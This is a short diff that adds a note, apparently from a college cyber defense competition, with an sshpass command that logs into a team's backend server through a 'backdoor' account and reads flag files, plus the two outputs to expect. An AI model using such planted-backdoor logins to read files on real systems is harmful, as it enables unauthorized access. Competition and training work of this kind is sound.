@@ -1,0 +1,6 @@
+sshpass -p backdoor ssh -t backdoor@backend.team[num].isucdc.com "cat /etc/backend/*flag"
+
+
+This will return either:
+ch8keiwHaYBynmJPypZbIhrLaraw5hGpmy06jrdUKPtDRf6Gct
+cat: '/etc/backend/*.flag': No such file or directory
